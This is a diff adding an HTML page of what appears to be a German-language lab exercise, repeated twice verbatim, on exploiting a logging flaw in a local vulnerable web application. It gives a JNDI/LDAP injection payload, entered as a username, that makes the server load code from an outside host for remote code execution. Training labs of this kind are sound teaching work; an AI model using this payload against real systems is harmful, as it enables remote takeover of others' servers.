@@ -1,0 +1,28 @@
+<h3 id="exploit">Exploit</h3>
+<p>Um den Angriff durchführen zu können, müssen Sie nun die verwundbare
+Web-Anwendung “localhost:8080” über einen Browser ihrer Wahl öffnen.
+Anschließend müssen Sie die Log des Containers der Web-Anwendung öffnen
+um das logging der Anmeldeversuche anzuschauen. Sie werden nach
+versuchten Anmeldungen auf der Webseite Informationen wie “Incorrect
+login attempt for username `test´” in der Log sehen können. Hier merken
+Sie, dass Sie Kontrolle über einen Teil der protokollierten Zeichenfolge
+(z.B. Username) haben.</p>
+<p>Sie können eine Payload wie folgt eintragen, um Schadcode remote auf
+der Web-Anwendung auszuführen:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="va">${jndi</span><span class="op">:</span>ldap<span class="op">:</span>//&lt;HostIp&gt;<span class="op">:</span><span class="dv">1389</span>/&lt;RCEObjectName&gt;<span class="va">}</span></span></code></pre></div>
+<p><strong>Sie haben nun das Ende der Übung erreicht.</strong></p>
+<h3 id="exploit-1">Exploit</h3>
+<p>Um den Angriff durchführen zu können, müssen Sie nun die verwundbare
+Web-Anwendung “localhost:8080” über einen Browser ihrer Wahl öffnen.
+Anschließend müssen Sie die Log des Containers der Web-Anwendung öffnen
+um das logging der Anmeldeversuche anzuschauen. Sie werden nach
+versuchten Anmeldungen auf der Webseite Informationen wie “Incorrect
+login attempt for username `test´” in der Log sehen können. Hier merken
+Sie, dass Sie Kontrolle über einen Teil der protokollierten Zeichenfolge
+(z.B. Username) haben.</p>
+<p>Sie können eine Payload wie folgt eintragen, um Schadcode remote auf
+der Web-Anwendung auszuführen:</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="va">${jndi</span><span class="op">:</span>ldap<span class="op">:</span>//&lt;HostIp&gt;<span class="op">:</span><span class="dv">1389</span>/&lt;RCEObjectName&gt;<span class="va">}</span></span></code></pre></div>
+<p><strong>Sie haben nun das Ende der Übung erreicht.</strong></p>
